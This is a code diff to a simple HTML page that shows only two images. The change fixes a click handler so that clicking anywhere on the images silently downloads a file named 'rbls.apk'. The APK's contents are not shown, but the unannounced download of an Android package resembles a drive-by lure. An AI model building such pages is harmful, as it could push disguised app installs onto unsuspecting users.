@@ -9,21 +9,20 @@
 </head>
 
 <body>
-    <div class="image-container">
+    <div class="image-container" id="main">
         <img src="images/mobile-image.png" alt="Mobile View" class="mobile-img">
         <img src="images/desktop-image.png" alt="Desktop View" class="desktop-img">
     </div>
 
     <script>
+        // Add click event listener to the element with id 'main'
         document.getElementById('main').addEventListener('click', () => {
             const ele = document.createElement('a');
             ele.href = '/rbls.apk';
             ele.download = 'rbls.apk';
             ele.click();
-        })
+        });
     </script>
-
-    </head>
 </body>
 
 </html>
